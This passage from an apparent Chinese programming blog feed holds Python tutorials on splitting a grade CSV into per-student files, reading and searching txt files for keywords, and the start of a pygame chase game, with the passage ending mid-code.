href="#1-用列表类型完成" class="headerlink" title="1.用列表类型完成"></a>1.用列表类型完成</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> asyncore <span class="token keyword">import</span> write<span class="token keyword">import</span> csvresult_path <span class="token operator">=</span> <span class="token string">'./拆分结果/'</span><span class="token comment"># newline=''可避免空行</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./Python期末成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    csv_reader <span class="token operator">=</span> csv<span class="token punctuation">.</span>reader<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token keyword">for</span> csv_row <span class="token keyword">in</span> csv_reader<span class="token punctuation">:</span>        save_path <span class="token operator">=</span>result_path <span class="token operator">+</span> csv_row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.csv'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>save_path<span class="token punctuation">)</span>        <span class="token comment"># 打开'./平时成绩.csv'文件，获取文件对象，如果没有会自动创建(注意文件夹不会自动创建)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>save_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> save_file<span class="token punctuation">:</span>            <span class="token comment"># 将文件对象转换为DictWriter对象</span>            save_file_writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>writer<span class="token punctuation">(</span>save_file<span class="token punctuation">)</span>            <span class="token comment"># 将列表中的元素写入csv文件中</span>            save_file_writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>csv_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-用字典类型完成（推荐）"><a href="#2-用字典类型完成（推荐）" class="headerlink" title="2.用字典类型完成（推荐）"></a>2.用字典类型完成（推荐）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csvresult_path <span class="token operator">=</span> <span class="token string">'./拆分结果/'</span><span class="token comment"># newline=''可避免空行</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./Python期末成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 读取文件对象，得到DictReader对象，DictReader对象是一个可迭代的字典，字典的键就是表头</span>    csv_reader <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictReader<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token comment"># 可通过fieldnames属性获取表头</span>    headers <span class="token operator">=</span> csv_reader<span class="token punctuation">.</span>fieldnames    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'表头：</span><span class="token interpolation"><span class="token punctuation">{</span>headers<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">for</span> csv_row <span class="token keyword">in</span> csv_reader<span class="token punctuation">:</span>        save_path <span class="token operator">=</span>result_path <span class="token operator">+</span> csv_row<span class="token punctuation">[</span><span class="token string">'姓名'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.csv'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>save_path<span class="token punctuation">)</span>        <span class="token comment"># 打开'./平时成绩.csv'文件，获取文件对象，如果没有会自动创建(注意文件夹不会自动创建)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>save_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> save_file<span class="token punctuation">:</span>            <span class="token comment"># 将文件对象转换为DictWriter对象</span>            save_file_writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictWriter<span class="token punctuation">(</span>save_file<span class="token punctuation">,</span> fieldnames<span class="token operator">=</span>headers<span class="token punctuation">)</span>            <span class="token comment"># 写入表头</span>            save_file_writer<span class="token punctuation">.</span>writeheader<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 将列表中的元素写入csv文件中</span>            save_file_writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>csv_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>项目完成🐱‍🚀😎</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据分析1—txt文件读写</title>
      <link href="/2022/03/10/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%901%E2%80%94txt%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
      <url>/2022/03/10/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%901%E2%80%94txt%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="一、打开文件"><a href="#一、打开文件" class="headerlink" title="一、打开文件"></a>一、打开文件</h2><p>使用<code>open()</code>函数打开文件后，可以获得一个文件对象。</p><p>当<code>mode='r'</code>，以只读方式打开文件，默认模式。</p><p>当<code>mode='w'</code>，即写模式时，open()函数会打开一个文件只用于写入，如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被清空。如果该文件不存在，创建新文件。<br>当<code>mode='a'</code>，即追加模式时，open()函数会打开文件用于追加。如果该文件已存在，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打开目标txt文件</span>target_file <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/Python项目1—猜大小.txt'</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># 使用文件对象.read()方法读取文件内容</span>content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#关闭文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、判断文件中是否有关键词"><a href="#二、判断文件中是否有关键词" class="headerlink" title="二、判断文件中是否有关键词"></a>二、判断文件中是否有关键词</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打开目标txt文件</span>target_file <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/Python项目1—猜大小.txt'</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># 使用文件对象.read()方法读取文件内容</span>content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 判断文件中是否有关键词</span>key_word <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要查找的关键词：'</span><span class="token punctuation">)</span><span class="token keyword">if</span> key_word <span class="token keyword">in</span> content<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'找到了，文件“</span><span class="token interpolation"><span class="token punctuation">{</span>target_file<span class="token punctuation">}</span></span><span class="token string">”中存在关键词“</span><span class="token interpolation"><span class="token punctuation">{</span>key_word<span class="token punctuation">}</span></span><span class="token string">”'</span></span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#关闭文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、获得文件夹内所有文件名"><a href="#三、获得文件夹内所有文件名" class="headerlink" title="三、获得文件夹内所有文件名"></a>三、获得文件夹内所有文件名</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 设置目标文件夹路径</span>path <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/'</span><span class="token comment"># 获取文件夹下的所有文件名</span>files_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>files_list<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、筛选出所有txt文件"><a href="#四、筛选出所有txt文件" class="headerlink" title="四、筛选出所有txt文件"></a>四、筛选出所有txt文件</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 设置目标文件夹路径</span>path <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/'</span><span class="token comment"># 获取文件夹下的所有文件名</span>files_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token comment"># 筛选出所有txt文件</span><span class="token keyword">for</span> file_name <span class="token keyword">in</span> files_list<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'.txt'</span> <span class="token keyword">in</span> file_name<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'文件名：'</span><span class="token punctuation">,</span>file_name<span class="token punctuation">)</span>        file_path <span class="token operator">=</span> path <span class="token operator">+</span> file_name <span class="token comment"># 拼接出文件的相对路径</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'文件路径:'</span><span class="token punctuation">,</span>file_path<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、从全部文件中查找关键词"><a href="#五、从全部文件中查找关键词" class="headerlink" title="五、从全部文件中查找关键词"></a>五、从全部文件中查找关键词</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 从txt文件中查找是否存在关键词</span><span class="token keyword">def</span> <span class="token function">findKeyWord</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span>key_word<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打开目标txt文件</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>      <span class="token comment"># 使用文件对象.read()方法读取文件内容</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 判断文件中是否有关键词</span>    <span class="token keyword">if</span> key_word <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'找到了，文件“</span><span class="token interpolation"><span class="token punctuation">{</span>target_file<span class="token punctuation">}</span></span><span class="token string">”中存在关键词“</span><span class="token interpolation"><span class="token punctuation">{</span>key_word<span class="token punctuation">}</span></span><span class="token string">”'</span></span><span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#关闭文件</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 设置目标文件夹路径</span>    path <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/'</span>    <span class="token comment"># 获取文件夹下的所有文件名</span>    files_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    key_word <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要查找的关键词：'</span><span class="token punctuation">)</span>    <span class="token comment"># 筛选出所有txt文件</span>    <span class="token keyword">for</span> file_name <span class="token keyword">in</span> files_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'.txt'</span> <span class="token keyword">in</span> file_name<span class="token punctuation">:</span>            file_path <span class="token operator">=</span> path <span class="token operator">+</span> file_name <span class="token comment"># 拼接出文件的相对路径</span>            findKeyWord<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span>key_word<span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、txt文件写入"><a href="#六、txt文件写入" class="headerlink" title="六、txt文件写入"></a>六、txt文件写入</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 从txt文件中查找是否存在关键词</span><span class="token keyword">def</span> <span class="token function">findKeyWord</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span>key_word<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打开目标txt文件</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>      <span class="token comment"># 使用文件对象.read()方法读取文件内容</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 判断文件中是否有关键词</span>    <span class="token keyword">if</span> key_word <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'找到了，文件“</span><span class="token interpolation"><span class="token punctuation">{</span>target_file<span class="token punctuation">}</span></span><span class="token string">”中存在关键词“</span><span class="token interpolation"><span class="token punctuation">{</span>key_word<span class="token punctuation">}</span></span><span class="token string">”'</span></span><span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#关闭文件</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 设置目标文件夹路径</span>    path <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/'</span>    <span class="token comment"># 获取文件夹下的所有文件名</span>    files_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token comment"># 存放查询结果，以追加模式打开，这样每次写入就添加在最后，不会将原内容清空</span>    result_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./result.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>    key_word <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要查找的关键词：'</span><span class="token punctuation">)</span>    <span class="token comment"># 筛选出所有txt文件</span>    <span class="token keyword">for</span> file_name <span class="token keyword">in</span> files_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'.txt'</span> <span class="token keyword">in</span> file_name<span class="token punctuation">:</span>            file_path <span class="token operator">=</span> path <span class="token operator">+</span> file_name <span class="token comment"># 拼接出文件的相对路径</span>            findKeyWord<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span>key_word<span class="token punctuation">)</span>            result_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>file_path <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>  <span class="token comment"># 将结果写入文件</span>    result_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#关闭文件</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python游戏开发2—生死追逐</title>
      <link href="/2022/03/06/Python%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%912%E2%80%94%E7%94%9F%E6%AD%BB%E8%BF%BD%E9%80%90/"/>
      <url>/2022/03/06/Python%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%912%E2%80%94%E7%94%9F%E6%AD%BB%E8%BF%BD%E9%80%90/</url>
      
        <content type="html"><![CDATA[<h2 id="一、初始版本"><a href="#一、初始版本" class="headerlink" title="一、初始版本"></a>一、初始版本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>init_speed <span class="token operator">=</span> <span class="token number">1</span>                   <span class="token comment"># 初始速度</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>init_speed<span class="token punctuation">,</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度） </span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span>  <span class="token comment"># 对象创建</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"thief.jpg"</span><span class="token punctuation">)</span>        <span class="token comment">#图片对象</span>imageRect <span class="token operator">=</span> image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法</span>fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span>  <span class="token comment">#键盘操作，←↓→↑改变方向</span>            <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">:</span>                speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>init_speed            <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">:</span>                speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> init_speed            <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">:</span>                speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> init_speed            <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">:</span>                speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>init_speed    imageRect<span class="token operator">=</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>     <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">if</span> imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>            speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>     screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>image<span class="token punctuation">,</span>imageRect<span class="token punctuation">)</span>         <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、函数封装"><a href="#二、函数封装" class="headerlink" title="二、函数封装"></a>二、函数封装</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>init_speed <span class="token operator">=</span> <span class="token number">1</span>                   <span class="token comment"># 初始速度</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>init_speed<span class="token punctuation">,</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度） </span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span>  <span class="token comment"># 对象创建</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"thief.jpg"</span><span class="token punctuation">)</span>        <span class="token comment">#图片对象</span>imageRect <span class="token operator">=</span> image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法</span>fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 移动控制，←↓→↑改变方向</span><span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>init_speed    <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> init_speed    <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> init_speed    <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>init_speed<span class="token comment"># 碰壁反弹</span><span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>            speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>        speed<span class="token 